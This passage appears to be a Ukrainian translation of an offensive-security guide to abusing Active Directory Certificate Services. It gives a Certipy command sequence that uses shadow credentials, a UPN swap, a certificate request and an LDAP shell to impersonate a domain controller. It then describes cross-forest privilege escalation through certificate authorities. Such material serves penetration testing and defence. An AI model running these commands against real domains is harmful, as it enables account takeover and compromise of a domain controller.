–ó `CertificateMappingMethods`, —â–æ –º—ñ—Å—Ç–∏—Ç—å –ø—Ä–∞–ø–æ—Ä–µ—Ü—å `UPN` (`0x4`), –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å A –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏ `GenericWrite` –º–æ–∂–µ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å B, —É —è–∫–æ–≥–æ –≤—ñ–¥—Å—É—Ç–Ω—ñ–π –∞—Ç—Ä–∏–±—É—Ç `userPrincipalName`, –≤–∫–ª—é—á–∞—é—á–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ –º–∞—à–∏–Ω —Ç–∞ –≤–±—É–¥–æ–≤–∞–Ω–æ–≥–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –¥–æ–º–µ–Ω—É `Administrator`.

–¢—É—Ç –º–µ—Ç–∞ - —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç—É–≤–∞—Ç–∏ `DC$@corp.local`, –ø–æ—á–∏–Ω–∞—é—á–∏ –∑ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —Ö–µ—à—É `Jane` —á–µ—Ä–µ–∑ Shadow Credentials, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`userPrincipalName` –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ `Jane` –ø–æ—Ç—ñ–º –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –Ω–∞ `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
–°–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –¥–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∫–ª—ñ—î–Ω—Ç–∞ –∑–∞–ø–∏—Ç—É—î—Ç—å—Å—è —è–∫ `Jane`, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç–∏–ø–æ–≤–∏–π —à–∞–±–ª–æ–Ω `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`userPrincipalName` –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ `Jane` –ø–æ–≤–µ—Ä—Ç–∞—î—Ç—å—Å—è –¥–æ –ø–æ—á–∞—Ç–∫–æ–≤–æ–≥–æ –ø—ñ—Å–ª—è —Ü—å–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
–î–ª—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ Schannel –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –æ–ø—Ü—ñ—è `-ldap-shell` Certipy, —â–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—î —É—Å–ø—ñ—à–Ω—É –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é —è–∫ `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
–ß–µ—Ä–µ–∑ –æ–±–æ–ª–æ–Ω–∫—É LDAP, –∫–æ–º–∞–Ω–¥–∏, —Ç–∞–∫—ñ —è–∫ `set_rbcd`, –¥–æ–∑–≤–æ–ª—è—é—Ç—å –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∞—Ç–∞–∫–∏ –Ω–∞ –æ–±–º–µ–∂–µ–Ω–Ω—è –¥–µ–ª–µ–≥—É–≤–∞–Ω–Ω—è –Ω–∞ –æ—Å–Ω–æ–≤—ñ —Ä–µ—Å—É—Ä—Å—ñ–≤ (RBCD), —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ –ø—ñ–¥—ñ—Ä–≤–∞—Ç–∏ –∫–æ–Ω—Ç—Ä–æ–ª–µ—Ä –¥–æ–º–µ–Ω—É.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
–¶—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —Ç–∞–∫–æ–∂ –ø–æ—à–∏—Ä—é—î—Ç—å—Å—è –Ω–∞ –±—É–¥—å-—è–∫–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫–æ–º—É –Ω–µ –≤–∏—Å—Ç–∞—á–∞—î `userPrincipalName` –∞–±–æ –¥–µ –≤—ñ–Ω –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î `sAMAccountName`, –∑—ñ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∏–º `Administrator@corp.local` —è–∫ –æ—Å–Ω–æ–≤–Ω–æ—é –º–µ—Ç–æ—é —á–µ—Ä–µ–∑ –π–æ–≥–æ –ø—ñ–¥–≤–∏—â–µ–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó LDAP —Ç–∞ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å `userPrincipalName` –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º.


## –ö–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü—ñ—è –õ—ñ—Å—ñ–≤ –∑–∞ –î–æ–ø–æ–º–æ–≥–æ—é –°–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ –ü–æ—è—Å–Ω–µ–Ω–æ –≤ –°—Ç—Ä–∞–∂–¥–∞–ª—å–Ω–æ–º—É –°–ø–æ—Å–æ–±—ñ

### –ü–æ—Ä—É—à–µ–Ω–Ω—è –î–æ–≤—ñ—Ä–∏ –¥–æ –õ—ñ—Å—ñ–≤ –∑–∞ –î–æ–ø–æ–º–æ–≥–æ—é –ö–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏—Ö –¶–µ–Ω—Ç—Ä—ñ–≤ –°–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó

–ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –¥–ª—è **–ø–µ—Ä–µ—Ç–∏–Ω–Ω–æ–≥–æ –Ω–∞–¥–∞–Ω–Ω—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤** —Ä–æ–±–∏—Ç—å—Å—è –≤—ñ–¥–Ω–æ—Å–Ω–æ –ø—Ä–æ—Å—Ç–æ—é. **–°–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –∫–æ—Ä–µ–Ω–µ–≤–æ–≥–æ –¶–°** –∑ —Ä–µ—Å—É—Ä—Å–Ω–æ–≥–æ –ª—ñ—Å—É **–ø—É–±–ª—ñ–∫—É—î—Ç—å—Å—è –≤ –ª—ñ—Å–∞—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤** –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º–∏, –∞ **—Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏ –ø—ñ–¥–ø—Ä–∏—î–º—Å—Ç–≤–∞ –¶–°** –∑ —Ä–µ—Å—É—Ä—Å–Ω–æ–≥–æ –ª—ñ—Å—É **–¥–æ–¥–∞—é—Ç—å—Å—è –¥–æ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ–≤ `NTAuthCertificates` —Ç–∞ AIA –≤ –∫–æ–∂–Ω–æ–º—É –ª—ñ—Å—ñ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤**. –î–ª—è —É—Ç–æ—á–Ω–µ–Ω–Ω—è, —Ü—è —É–≥–æ–¥–∞ –Ω–∞–¥–∞—î **–¶–° –≤ —Ä–µ—Å—É—Ä—Å–Ω–æ–º—É –ª—ñ—Å—ñ –ø–æ–≤–Ω–∏–π –∫–æ–Ω—Ç—Ä–æ–ª—å** –Ω–∞–¥ —É—Å—ñ–º–∞ —ñ–Ω—à–∏–º–∏ –ª—ñ—Å–∞–º–∏, —è–∫—ñ –≤—ñ–Ω –∫–µ—Ä—É—î —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è–º –ö–ó–Ü. –Ø–∫—â–æ —Ü–µ–π –¶–° –±—É–¥–µ **–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–π –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º–∏**, —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏ –¥–ª—è –≤—Å—ñ—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —è–∫ —É —Ä–µ—Å—É—Ä—Å–Ω–æ–º—É, —Ç–∞–∫ —ñ –≤ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –ª—ñ—Å–∞—Ö –º–æ–∂—É—Ç—å –±—É—Ç–∏ **–ø—ñ–¥—Ä–æ–±–ª–µ–Ω—ñ –Ω–∏–º–∏**, —Ç–∏–º —Å–∞–º–∏–º –ø–æ—Ä—É—à—É—é—á–∏ –±–µ–∑–ø–µ–∫–æ–≤–∏–π –±–∞—Ä'—î—Ä –ª—ñ—Å—É.

### –ù–∞–¥–∞–Ω–Ω—è –ü—Ä–∏–≤—ñ–ª–µ—ó–≤ –ù–∞–¥–∞–Ω–Ω—è –°–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ –Ü–Ω–æ–∑–µ–º–Ω–∏–º –°—É–±'—î–∫—Ç–∞–º

–£ —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö –∑ –∫—ñ–ª—å–∫–æ–º–∞ –ª—ñ—Å–∞–º–∏ –æ–±–µ—Ä–µ–∂–Ω—ñ—Å—Ç—å –ø–æ—Ç—Ä—ñ–±–Ω–∞ —â–æ–¥–æ –¶–° –ø—ñ–¥–ø—Ä–∏—î–º—Å—Ç–≤–∞, —è–∫—ñ **–ø—É–±–ª—ñ–∫—É—é—Ç—å —à–∞–±–ª–æ–Ω–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤**, —è–∫—ñ –¥–æ–∑–≤–æ–ª—è—é—Ç—å **–ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–º –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –∞–±–æ —ñ–Ω–æ–∑–µ–º–Ω–∏–º —Å—É–±'—î–∫—Ç–∞–º** (–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º/–≥—Ä—É–ø–∞–º –∑–æ–≤–Ω—ñ—à–Ω—ñ–º –¥–ª—è –ª—ñ—Å—É, –¥–æ —è–∫–æ–≥–æ –Ω–∞–ª–µ–∂–∏—Ç—å –¶–° –ø—ñ–¥–ø—Ä–∏—î–º—Å—Ç–≤–∞) **–ø—Ä–∞–≤–∞ –Ω–∞ –Ω–∞–¥–∞–Ω–Ω—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ —Ç–∞ –ø—Ä–∞–≤–∞ –Ω–∞ —Ä–µ–¥–∞–≥—É–≤–∞–Ω–Ω—è**.\
–ü—ñ–¥ —á–∞—Å –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ –¥–æ–≤—ñ—Ä—É, **SID –ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏—Ö –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤** –¥–æ–¥–∞—î—Ç—å—Å—è –¥–æ —Ç–æ–∫–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —á–µ—Ä–µ–∑ AD. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, —è–∫—â–æ –¥–æ–º–µ–Ω –º–∞—î –¶–° –ø—ñ–¥–ø—Ä–∏—î–º—Å—Ç–≤–∞ –∑ —à–∞–±–ª–æ–Ω–æ–º, —è–∫–∏–π **–¥–æ–∑–≤–æ–ª—è—î –ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–º –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º –ø—Ä–∞–≤–∞ –Ω–∞ –Ω–∞–¥–∞–Ω–Ω—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤**, —à–∞–±–ª–æ–Ω –º–æ–∂–µ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –±—É—Ç–∏ **–Ω–∞–¥–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º –∑ —ñ–Ω—à–æ–≥–æ –ª—ñ—Å—É**. –¢–∞–∫ —Å–∞–º–æ, —è–∫—â–æ **–ø—Ä–∞–≤–∞ –Ω–∞ –Ω–∞–¥–∞–Ω–Ω—è —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç—ñ–≤ —è–≤–Ω–æ –Ω–∞–¥–∞–Ω—ñ —ñ–Ω–æ–∑–µ–º–Ω–æ–º—É —Å—É–±'—î–∫—Ç—É —à–∞–±–ª–æ–Ω–æ–º**, —Ç–∏–º —Å–∞–º–∏–º —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è **–ø–µ—Ä–µ—Ç–∏–Ω–Ω–∏–π –≤—ñ–¥–Ω–æ—Å–∏–Ω–∏ –∫–æ–Ω—Ç—Ä–æ–ª—é –¥–æ—Å—Ç—É–ø—É**, —â–æ –¥–æ–∑–≤–æ–ª—è—î —Å—É–±'—î–∫—Ç—É –∑ –æ–¥–Ω–æ–≥–æ –ª—ñ—Å—É **–Ω–∞–¥–∞–≤–∞—Ç–∏ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç —à–∞–±–ª–æ–Ω—É –∑ —ñ–Ω—à–æ–≥–æ –ª—ñ—Å—É**.

–û–±–∏–¥–≤–∞ —Å—Ü–µ–Ω–∞—Ä—ñ—ó –ø—Ä–∏–∑–≤–æ–¥—è—Ç—å –¥–æ **–∑–±—ñ–ª—å—à–µ–Ω–Ω—è –ø–æ–≤–µ—Ä—Ö–Ω—ñ –∞—Ç–∞–∫–∏** –∑ –æ–¥–Ω–æ–≥–æ –ª—ñ—Å—É –≤ —ñ–Ω—à–∏–π. –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è —à–∞–±–ª–æ–Ω—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –≤ —ñ–Ω—à–æ–º—É –¥–æ–º–µ–Ω—ñ.
